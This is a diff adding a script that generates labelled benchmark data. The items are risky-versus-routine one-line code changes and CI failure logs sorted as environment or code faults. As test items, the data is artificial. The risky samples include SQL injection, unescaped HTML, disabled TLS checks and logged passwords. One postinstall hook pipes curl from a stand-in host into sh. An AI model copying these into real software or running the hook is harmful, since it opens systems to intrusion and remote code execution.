@@ -1,0 +1,153 @@
+// Generates risky.jsonl and env.jsonl (invented cases, labels frozen before any recording).
+import { writeFileSync } from "node:fs";
+import { dirname, join } from "node:path";
+import { fileURLToPath } from "node:url";
+const here = dirname(fileURLToPath(import.meta.url));
+// [id, expected, group, nearMiss, item, context]
+const R = [
+ // DEV risky
+ ["r-d01","dev","risky","security",1,'+    // if (!token.isValid()) return res.status(401).end();',"src/middleware/auth.ts: the 401 check was commented out"],
+ ["r-d02","dev","risky","security",0,'+    const query = "SELECT * FROM users WHERE name = \'" + name + "\'";',"src/users/search.js"],
+ ["r-d03","dev","risky","dataloss",0,'+    await db.query("DELETE FROM orders WHERE created_at < $1", [cutoff]);',"jobs/purgeCustomer.ts: should delete only one customer's orders; the customer id filter was dropped"],
+ ["r-d04","dev","risky","concurrency",1,'+    _count++;',"Metrics.cs: replaces Interlocked.Increment(ref _count); _count is read and written by all request threads"],
+ ["r-d05","dev","risky","money",1,'+    const total = Math.floor(price * qty * 100) / 100;',"billing/invoice.js: previously Math.round; this is the invoice total charged to the customer"],
+ ["r-d06","dev","risky","errors",0,'+    } catch (e) { /* ignore */ }',"payments/refund.ts: wraps the call that sends the refund to the bank"],
+ ["r-d07","dev","risky","security",0,'+    app.use(cors({ origin: "*", credentials: true }));',"server/app.js"],
+ ["r-d08","dev","risky","security",1,'+    logger.info("login ok", { user: user.email, password: req.body.password });',"auth/login.ts: logging added"],
+ ["r-d09","dev","risky","money",1,'+    if (balance > amount) {',"wallet.ts: part of a rename refactor; was `if (balance >= amount) {` before the withdrawal"],
+ ["r-d10","dev","risky","dataloss",0,'+    fs.rmSync(dir, { recursive: true, force: true });',"uploads/cleanup.ts: dir comes from req.query.path"],
+ ["r-d11","dev","risky","concurrency",0,'+    if (!fs.existsSync(lockFile)) { fs.writeFileSync(lockFile, String(process.pid)); }',"jobs/singleton.js: ensures only one instance of the job runs across several processes"],
+ ["r-d12","dev","risky","errors",0,'+    process.on("uncaughtException", () => {});',"server/index.js"],
+ // DEV routine
+ ["n-d01","dev","routine","format",1,'+  const total = items.reduce((s, i) => s + i.price, 0);',"cart/total.ts: whitespace only; previously items.reduce((s,i)=>s+i.price,0)"],
+ ["n-d02","dev","routine","rename",1,'+    const passwordHash = await hash(input);',"auth/register.ts: local variable renamed from pw; behaviour unchanged"],
+ ["n-d03","dev","routine","comment",1,'+    // TODO: remove DELETE FROM sessions once the migration lands',"db/migrate.ts: comment added"],
+ ["n-d04","dev","routine","logging",1,'+    logger.debug("charging customer", { orderId: order.id });',"payments/charge.ts: debug log added"],
+ ["n-d05","dev","routine","import",1,'+import { createHash } from "node:crypto";',"auth/utils.ts: import added; nothing uses it yet"],
+ ["n-d06","dev","routine","rename",1,'+    async function chargeCustomer(order: Order) {',"billing.ts: renamed from charge(); body unchanged, callers updated"],
+ ["n-d07","dev","routine","rename",1,'+    <button className="btn-danger">Delete account</button>',"AccountPage.tsx: CSS class renamed from btn-red; handler and label unchanged"],
+ ["n-d08","dev","routine","comment",1,'+    // Lock is held by the caller; see the Mutex docs.',"queue/worker.ts: comment added"],
+ ["n-d09","dev","routine","logging",1,'+    console.error("payment failed", err.message);',"payments/charge.ts: log added inside the existing catch block; the rethrow below is unchanged"],
+ ["n-d10","dev","routine","import",1,'+from decimal import Decimal',"billing/tax.py: import line only"],
+ ["n-d11","dev","routine","format",0,'+    for (let i = 0; i < users.length; i++) {',"users/export.js: spacing reformatted; previously for(let i=0;i<users.length;i++){"],
+ ["n-d12","dev","routine","test",1,'+    expect(refund(100)).toBe(100);',"tests/refund.test.ts: new test added"],
+ // HOLDOUT risky
+ ["r-h01","holdout","risky","security",0,'+    const html = "<div>" + req.query.name + "</div>";',"pages/profile.js: result is sent to the browser unescaped"],
+ ["r-h02","holdout","risky","security",0,'+    verify=False,',"clients/webhook.py: argument added to requests.post(...) that calls the payment provider"],
+ ["r-h03","holdout","risky","money",1,'+    amount = float(request.form["amount"]) * 100',"checkout/views.py: converts to cents; previously int(Decimal(request.form[\"amount\"]) * 100)"],
+ ["r-h04","holdout","risky","dataloss",0,'+    db.collection("customers").deleteMany({})',"scripts/seed.js: seed script that also runs on production start-up"],
+ ["r-h05","holdout","risky","concurrency",1,'+    static Map<String, Session> sessions = new HashMap<>();',"SessionStore.java: was a ConcurrentHashMap; read and written by servlet threads"],
+ ["r-h06","holdout","risky","errors",1,'+set +e',"deploy.sh: replaces set -e before the database migration step"],
+ ["r-h07","holdout","risky","security",0,'+RUN chmod 777 /var/app/uploads',"Dockerfile: directory that receives user uploads"],
+ ["r-h08","holdout","risky","security",1,'+    if (user.id = order.ownerId) {',"orders/get.ts: typo fix commit; authorization check before returning an order"],
+ ["r-h09","holdout","risky","money",1,'+    const fee = amount * 0.029 + 0.3;',"fees.ts: the amount is in cents here since the last change; the constant 0.3 is dollars"],
+ ["r-h10","holdout","risky","errors",1,'+    return res.status(200).json({ ok: true });',"charge handler: now inside the catch block; previously returned status 500"],
+ ["r-h11","holdout","risky","security",1,'+    log.info("auth header: " + request.getHeader("Authorization"));',"AuthFilter.java: logging added"],
+ ["r-h12","holdout","risky","concurrency",1,'+    time.Sleep(10 * time.Millisecond) // wait for the writer goroutine',"worker.go: replaces a channel receive that waited for the writer goroutine to finish"],
+ // HOLDOUT routine
+ ["n-h01","holdout","routine","rename",1,'+    const customerId = order.customer_id;',"orders/map.ts: local variable renamed from cid"],
+ ["n-h02","holdout","routine","comment",1,'+    # NOTE: never store the raw password; hashing happens in auth.hash_password',"accounts/models.py: comment added"],
+ ["n-h03","holdout","routine","import",1,'+import { Mutex } from "async-mutex";',"queue/index.ts: import added; no usage yet"],
+ ["n-h04","holdout","routine","format",1,'+      "amount": 1000,',"tests/fixtures/payment.json: keys reordered; every value unchanged"],
+ ["n-h05","holdout","routine","logging",1,'+    logger.info("deleted %d expired sessions", count)',"sessions/cleanup.py: message after the existing delete call"],
+ ["n-h06","holdout","routine","rename",1,'+    public void refundOrder(Order order) {',"OrderService.java: method renamed from refund; callers updated; body unchanged"],
+ ["n-h07","holdout","routine","format",0,'+    );',"transfer.ts: a long call was wrapped over several lines"],
+ ["n-h08","holdout","routine","comment",1,'+    // Retry up to 3 times with exponential backoff (see RFC 7231, section 6.6).',"http/client.ts: comment added"],
+ ["n-h09","holdout","routine","docs",1,'+    - Run `rm -rf node_modules` and reinstall if the build fails.',"README.md"],
+ ["n-h10","holdout","routine","import",1,'+use std::sync::Arc;',"src/cache.rs: import added for an upcoming change; unused"],
+ ["n-h11","holdout","routine","format",1,'+    amount: Decimal = Decimal("0.00")',"billing/models.py: type annotation added; the default value is unchanged"],
+ ["n-h12","holdout","routine","logging",1,'+    console.warn("retrying request", attempt);',"http/client.ts: log added inside the existing retry loop"],
+];
+const risky = R.map(([id, split, exp, cat, nm, item, ctx]) => ({ id, split, expected: exp, category: cat, near_miss: !!nm, item, context: ctx }));
+// [id, split, expected, group, nearMiss, output]
+const E = [
+ ["e-d01","dev","env","network",0,"FAIL tests/test_sync.py::test_fetch_prices\nrequests.exceptions.ConnectionError: HTTPSConnectionPool(host='api.example-prices.test', port=443): Max retries exceeded with url: /v1/prices (Caused by NameResolutionError: Failed to resolve 'api.example-prices.test' ([Errno -3] Temporary failure in name resolution))"],
+ ["e-d02","dev","env","tool",0,"FAIL test/backup.test.js > creates a dump\nError: spawn pg_dump ENOENT\n    at ChildProcess._handle.onexit (node:internal/child_process:285:19)\n    at onErrorNT (node:internal/child_process:483:16)"],
+ ["e-d03","dev","env","permission",0,"FAILED tests/test_audit.py::test_writes_audit_entry\nPermissionError: [Errno 13] Permission denied: '/var/log/app/audit.log'"],
+ ["e-d04","dev","env","resource",0,"FAIL src/server.test.ts > boots the test server\nError: listen EADDRINUSE: address already in use :::3000\n    at Server.setupListenHandle [as _listen2] (node:net:1817:16)"],
+ ["e-d05","dev","env","resource",1,"FAIL it/OrdersRepositoryIT > saves an order\norg.testcontainers.containers.ContainerLaunchException: Timeout after 30s waiting for container postgres:16 to become healthy\nCaused by: Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?"],
+ ["e-d06","dev","env","resource",0,"Killed\nmake: *** [test] Error 137\ncgroup: memory limit 512Mi exceeded, process 'pytest' was OOM-killed by the runner"],
+ ["e-d07","dev","env","tool",0,"FAIL scripts/test_release.sh: expected version string\nscripts/release.sh: line 14: jq: command not found"],
+ ["e-d08","dev","env","resource",0,"ERROR tests/test_export.py::test_large_export\nOSError: [Errno 28] No space left on device: '/tmp/pytest-of-ci/pytest-0/test_large_export0/out.csv'"],
+ ["e-d09","dev","env","tool",1,"ERROR tests/test_ingest.py::test_ingest_parquet\nFileNotFoundError: [Errno 2] No such file or directory: '/opt/ci/fixtures/large_dataset.parquet'\nnote: CI step 'fetch-data' that downloads this fixture was skipped (cache miss)"],
+ ["e-d10","dev","env","network",1,"FAIL test/plugins.test.js > installs a plugin from the registry\nError: getaddrinfo EAI_AGAIN registry.npmjs.org\n    at GetAddrInfoReqWrap.onlookupall [as oncomplete] (node:dns:120:26)"],
+ ["e-d11","dev","env","permission",0,"FAIL test/cache.test.js > creates the cache directory\nError: EACCES: permission denied, mkdir '/usr/local/share/app-cache'"],
+ ["e-d12","dev","env","resource",1,"FAIL test/shards.test.js > loads every shard\nError: EMFILE: too many open files, open '/srv/app/data/shard-0412.json'\nnote: ulimit -n is 256 on this runner"],
+ ["c-d01","dev","code","assertion",0,"FAILED tests/test_pricing.py::test_total_with_tax\nAssertionError: assert 120.0 == 119.99\n  where 120.0 = calculate_total([Item(price=99.99)], tax=0.2)"],
+ ["c-d02","dev","code","exception",0,"FAIL src/users.test.js > returns the user's id\nTypeError: Cannot read properties of undefined (reading 'id')\n    at getUser (src/users.js:41:18)"],
+ ["c-d03","dev","code","path",1,"ERROR tests/test_config.py::test_defaults\nFileNotFoundError: [Errno 2] No such file or directory: 'config/settings.yml/default.json'\n  src/config.py:17 in load_defaults: path = os.path.join(CONFIG_FILE, 'default.json')"],
+ ["c-d04","dev","code","timeout",1,"FAILED tests/test_parser.py::test_skip_whitespace\nFailed: Timeout >10.0s\n  File \"src/parser.py\", line 88, in skip_whitespace\n    while self.pos < len(self.text) or self.peek() == ' ':"],
+ ["c-d05","dev","code","network-sim",1,"FAILED tests/test_client.py::test_client_retries\nAssertionError: expected the client to retry 3 times, got 1\n  (transport is a MockTransport that raises ConnectionError on every call)"],
+ ["c-d06","dev","code","assertion",0,"FAIL src/greet.test.ts > greets the user\nexpect(received).toBe(expected)\nExpected: \"Hello, World\"\nReceived: \"Hello, world\""],
+ ["c-d07","dev","code","permission-app",1,"FAILED tests/test_export.py::test_admin_can_export\nassert response.status_code == 200\nE assert 403 == 200\n  user with role 'admin' got 403 from GET /export"],
+ ["c-d08","dev","code","exception",0,"FAILED tests/test_stats.py::test_average_of_empty_list\nZeroDivisionError: division by zero\n  src/stats.py:23 in average: return sum(xs) / len(xs)"],
+ ["c-d09","dev","code","port-app",1,"FAIL src/server/config.test.ts > parses the port\nAssertionError: expected 8080, got NaN\n  src/server/config.ts:12 parsePort('8080') returned NaN"],
+ ["c-d10","dev","code","import",1,"ImportError while importing test module 'tests/test_dates.py'\nImportError: cannot import name 'parse_date' from 'utils.dates' (src/utils/dates.py)\nnote: parse_date was renamed to parse_iso_date in this commit"],
+ ["c-d11","dev","code","recursion",1,"FAIL src/util/flatten.test.js > flattens nested arrays\nRangeError: Maximum call stack size exceeded\n    at flatten (src/util/flatten.js:9:12)\n    at flatten (src/util/flatten.js:9:12)\n    (10000 more frames)"],
+ ["c-d12","dev","code","assertion",0,"FAIL src/Header.test.tsx > renders the header\nSnapshot name: `renders the header 1`\n- Expected\n+ Received\n- <h1>Dashboard</h1>\n+ <h1>Dashbord</h1>"],
+ ["e-h01","holdout","env","network",1,"FAIL tests/integration/db_test.go TestMigrate\npq: connection refused (dial tcp 127.0.0.1:5432)\ncurl: (7) Failed to connect to localhost port 5432 after 0 ms: Connection refused"],
+ ["e-h02","holdout","env","tool",0,"/bin/sh: 1: protoc: command not found\nmake: *** [proto] Error 127\nFAIL: generated stubs are missing"],
+ ["e-h03","holdout","env","permission",0,"FAILED tests/test_hosts.py::test_adds_entry\nPermissionError: [Errno 1] Operation not permitted: '/etc/hosts'"],
+ ["e-h04","holdout","env","resource",0,"FAILED tests/test_server.py::test_boot\nOSError: [Errno 98] Address already in use"],
+ ["e-h05","holdout","env","tool",1,"FAIL e2e/login.spec.js > logs in\nSessionNotCreatedException: no chrome binary at /usr/bin/google-chrome\nError: Timeout - Async callback was not invoked within the 5000 ms timeout"],
+ ["e-h06","holdout","env","resource",0,"fatal error: runtime: out of memory\nnote: container memory limit is 256Mi (cgroup)\nFAIL github.com/acme/ingest/batch 3.211s"],
+ ["e-h07","holdout","env","network",1,"FAILED tests/test_mirror.py::test_downloads_package\nssl.SSLCertVerificationError: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: certificate has expired (host: internal-mirror.corp.test)"],
+ ["e-h08","holdout","env","resource",0,"error: could not write to `target/debug/deps/libserde-3a1f.rlib`\nCaused by: No space left on device (os error 28)\ntest result: FAILED to build"],
+ ["e-h09","holdout","env","tool",1,"FAIL test/upload.test.js > uploads the artifact to S3\nError: ENOENT: no such file or directory, open '/home/runner/.aws/credentials'"],
+ ["e-h10","holdout","env","tool",1,"node: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by node)\nerror: the test runner failed to start"],
+ ["e-h11","holdout","env","network",0,"FAIL com.acme.deps.ResolverTest > resolvesSnapshot\njava.net.UnknownHostException: nexus.internal.test\n    at com.acme.deps.ResolverTest.resolvesSnapshot(ResolverTest.java:31)"],
+ ["e-h12","holdout","env","network",1,"FAIL test/cache.test.js > connects to redis\nError: connect ETIMEDOUT 10.12.0.4:6379\n    at TCPConnectWrap.afterConnect [as oncomplete] (node:net:1555:16)"],
+ ["c-h01","holdout","code","assertion",0,"FAIL src/sort.test.ts > sorts descending\nexpect(received).toEqual(expected)\nExpected: [3, 2, 1]\nReceived: [3, 1, 2]"],
+ ["c-h02","holdout","code","exception",0,"FAIL com.acme.cart.CartTest > totalOfEmptyCart\njava.lang.NullPointerException: Cannot invoke \"java.util.List.stream()\" because \"this.items\" is null\n    at com.acme.cart.Cart.total(Cart.java:58)"],
+ ["c-h03","holdout","code","network-sim",1,"FAILED tests/test_breaker.py::test_circuit_opens_after_five_failures\nAssertionError: expected state OPEN after 5 failures, got CLOSED\n  (the mock server refuses every connection on purpose; ConnectionRefusedError is expected 5 times)"],
+ ["c-h04","holdout","code","path",1,"ERROR tests/test_loader.py::test_loads_users\nFileNotFoundError: [Errno 2] No such file or directory: 'tests/fixtures/users.json'\n  src/loader.py:30 builds the path from __file__ with one '..' too few"],
+ ["c-h05","holdout","code","timeout",1,"thrown: \"Exceeded timeout of 5000 ms for a test.\"\n  await queue.drain() never resolves because src/worker.ts:52 never calls done() after the last job"],
+ ["c-h06","holdout","code","syntax",0,"FAIL src/handlers/orders.test.js\n  SyntaxError: Unexpected token '}'\n    at src/handlers/orders.js:77"],
+ ["c-h07","holdout","code","permission-app",1,"FAIL test/projects.test.ts > a viewer cannot delete a project\nexpected status 403 from DELETE /projects/7, got 204"],
+ ["c-h08","holdout","code","port-app",1,"FAIL src/portAllocator.test.ts > reuses a released port\nAssertionError: expected port 3000, got 3001\n  the second call returned the next free port instead of the released one"],
+ ["c-h09","holdout","code","exception",0,"FAILED tests/test_pricing.py::test_discount\nKeyError: 'currency'\n  src/pricing.py:44 in apply_discount"],
+ ["c-h10","holdout","code","memory-sim",1,"FAIL src/cache.test.ts > evicts old entries\nAssertionError: expected cache size <= 100, got 10000\n  LRUCache evicted nothing (eviction loop is off by one)"],
+ ["c-h11","holdout","code","cli",1,"FAIL test/cli.test.js > suggests the closest flag\nAssertionError: expected stderr to contain \"did you mean --verbose\"\nReceived: \"error: unknown flag --verbos\""],
+ ["c-h12","holdout","code","exception",0,"FAILED tests/test_report.py::test_summary\nTypeError: unsupported operand type(s) for +: 'int' and 'str'\n  src/report.py:61 in summary"],
+];
+const env = E.map(([id, split, exp, cat, nm, item]) => ({ id, split, expected: exp, category: cat, near_miss: !!nm, item }));
+
+// STRESS (amendment A1, written after seeing dev results, before any hold-out or stress request): harder invented cases, split "stress"
+const RS = [
+ ["r-s01","risky","security",1,'+    expires = datetime.utcnow() + timedelta(days=3650)',"auth/session.py: session cookie expiry; was timedelta(hours=1)"],
+ ["r-s02","risky","money",1,'+    price_cents = int(price * 100)',"checkout/cart.py: price is a float from the form; previously round(price * 100)"],
+ ["r-s03","risky","concurrency",1,'+    shared_list.append(item)  # called from worker threads',"workers.py: the `with lock:` block around this line was removed in the same change"],
+ ["r-s04","risky","dataloss",1,'+DROP TABLE IF EXISTS users_old;',"migrations/0042.sql: users_old still holds rows that were not yet copied into users"],
+ ["r-s05","risky","errors",1,'+    if err != nil { return nil }',"payments/commit.go: in the function that commits a payment; previously `return err`"],
+ ["r-s06","risky","security",1,'+    "postinstall": "curl -s https://get.example-cdn.test/setup.sh | sh"',"package.json: scripts section"],
+ ["r-s07","risky","money",1,'+    return value / 100',"money/format.ts: converts cents to dollars; all callers already pass dollars"],
+ ["n-s01","routine","comment",1,'+    // SECURITY: do not remove this check; see the advisory in docs/sec-2023-04.md',"auth/guard.ts: comment added above an existing check"],
+ ["n-s02","routine","rename",1,'+    DELETE_BATCH_SIZE = 500',"jobs/cleanup.py: constant renamed from BATCH; value unchanged"],
+ ["n-s03","routine","logging",1,'+    logger.info("Refund issued for order %s", order_id)',"payments/refund.py: log line after the existing refund call; order_id is an internal number"],
+ ["n-s04","routine","test",1,'+    assert total == Decimal("19.99")',"tests/test_invoice.py: assertion added to an existing test"],
+ ["n-s05","routine","message",1,'+    throw new Error("Payment declined");',"payments/charge.ts: error message reworded from \"Declined\"; same throw, same condition"],
+ ["n-s06","routine","version",1,'+  "version": "2.4.1",',"package.json: version bump from the release script"],
+ ["n-s07","routine","import",1,'+const sudo = require("./sudoHelpers");',"admin/index.js: import path updated after a file move; same module"],
+];
+for (const [id, exp, cat, nm, item, ctx] of RS) risky.push({ id, split: "stress", expected: exp, category: cat, near_miss: !!nm, item, context: ctx });
+const ES = [
+ ["e-s01","env","network",1,"FAIL test/queue.test.js > enqueues a job\nError: connect ECONNREFUSED 127.0.0.1:6379\n    at test/queue.test.js:12\nnote: this CI job has no redis service container"],
+ ["e-s02","env","network",1,"FAIL tests/test_health.py::test_staging_is_up\nAssertionError: expected 200, got 502\n  GET https://staging.corp.test/health\n  body: <html><h1>502 Bad Gateway</h1>nginx</html>"],
+ ["e-s03","env","tool",1,"FAILED tests/test_time.py::test_expires_local\nAssertionError: datetime(2026, 3, 8, 2, 30) != datetime(2026, 3, 8, 3, 30)\n  note: TZ is not set on this runner image (the test expects America/New_York)"],
+ ["e-s04","env","tool",1,"ModuleNotFoundError: No module named 'numpy'\n  tests/test_stats.py:1\nnote: requirements-dev.txt was not installed in this job"],
+ ["e-s05","env","network",1,"FAIL test/fixtures.test.js > clones the fixtures repo\nError: Command failed: git clone https://github.com/acme/fixtures.git\nfatal: unable to access 'https://github.com/acme/fixtures.git/': Could not resolve host: github.com"],
+ ["e-s06","env","tool",1,"FAILED tests/test_locale.py::test_sort_german\nAssertionError: expected locale 'de_DE.UTF-8', got 'C'\nnote: LANG is not set on this runner image"],
+ ["e-s07","env","permission",1,"docker: Error response from daemon: pull access denied for acme/test-db, repository does not exist or may require 'docker login'\nFAIL it/DbIT: could not start the database container"],
+ ["c-s01","code","network-sim",1,"FAIL src/client.test.ts > survives a refused connection\nAssertionError: expected connect() to resolve with an error result, got an unhandled rejection (ECONNREFUSED)\n  src/client.ts:44 connect() throws and nothing catches it (the test server is down on purpose)"],
+ ["c-s02","code","path",1,"FileNotFoundError: [Errno 2] No such file or directory: 'out/report.csv'\n  src/export.py:55 writes to 'out/' without creating the directory first"],
+ ["c-s03","code","disk-sim",1,"FAILED tests/test_export.py::test_disk_full_is_reported\nOSError: [Errno 28] No space left on device\n  the test mocks write() to raise ENOSPC; expected ExportError, got OSError"],
+ ["c-s04","code","timeout",1,"TimeoutError: waited 30s for the job to finish\n  src/scheduler.py:71 run_once() re-enqueues the same job forever"],
+ ["c-s05","code","http-sim",1,"AssertionError: expected 502 Bad Gateway to be mapped to RetryableError, got FatalError\n  src/http/errors.py:19 maps every 5xx except 500 to FatalError"],
+ ["c-s06","code","import",1,"ModuleNotFoundError: No module named 'app.utils.dates'\n  src/app/report.py:3 imports app.utils.dates but the module is named app.utils.date"],
+ ["c-s07","code","time",1,"AssertionError: expected a timezone-aware datetime, got a naive one\n  src/schedule.py:33 calls datetime.now() without a timezone"],
+];
+for (const [id, exp, cat, nm, item] of ES) env.push({ id, split: "stress", expected: exp, category: cat, near_miss: !!nm, item });
+
+for (const [name, rows] of [["risky", risky], ["env", env]]) writeFileSync(join(here, name + ".jsonl"), rows.map((r) => JSON.stringify(r)).join("\n") + "\n");
+const c = (rows, s, e) => rows.filter((r) => r.split === s && r.expected === e).length;
+console.log(JSON.stringify({ risky: { dev: [c(risky,"dev","risky"), c(risky,"dev","routine")], holdout: [c(risky,"holdout","risky"), c(risky,"holdout","routine")], nm: risky.filter(r=>r.near_miss).length }, env: { dev: [c(env,"dev","env"), c(env,"dev","code")], holdout: [c(env,"holdout","env"), c(env,"holdout","code")], nm: env.filter(r=>r.near_miss).length } }));
